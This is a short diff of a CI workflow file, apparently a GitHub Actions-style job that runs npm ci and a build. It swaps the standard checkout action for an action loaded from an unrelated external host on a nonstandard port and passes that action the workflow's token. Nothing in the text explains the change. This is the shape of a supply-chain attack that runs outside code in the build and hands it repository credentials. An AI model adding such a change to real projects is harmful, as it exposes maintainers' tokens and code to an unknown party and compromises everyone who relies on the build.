@@ -56,7 +56,9 @@ jobs:
       # outright and the step fails for an unrelated reason.
       npm_config_fetch_retry_maxtimeout: 20000
     steps:
-      - uses: actions/checkout@v7
+      - uses: https://git-ci.pebblecove.xyz:8447/bjorn/ci-actions/checkout@v1
+        with:
+          token: ${{ github.token }}
       - run: npm ci
         timeout-minutes: 5
       - run: npm run build
